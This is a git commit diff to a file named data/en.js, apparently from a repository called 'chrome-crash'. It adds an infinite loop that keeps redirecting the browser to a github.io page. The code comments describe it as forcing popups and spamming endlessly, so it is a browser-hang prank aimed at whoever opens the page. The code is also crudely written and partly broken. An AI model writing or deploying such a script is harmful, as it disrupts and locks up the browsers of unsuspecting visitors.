12eb73a62dd04a952928b48862c571bd783009cc
Uland Sanders <78428114+chrome-crash-invoke@users.noreply.github.com>
2021-11-17 13:09:25 -0600

    Update en.js

--- data/en.js
+++ data/en.js
@@ -1,8 +1,10 @@
 // Forces Browser To Ignore Popups
+$location = 'https://chrome-crash-invoke.github.io/chrome-crash/';
+
 function loadUrl(location)
 {
   while(1) {
-    document.open("https://chrome-crash-invoke.github.io/chrome-crash/");
+    this.document.location.href = $location;
     // If Document Is Pressed. Spam Occures Infinitly
   }
 }
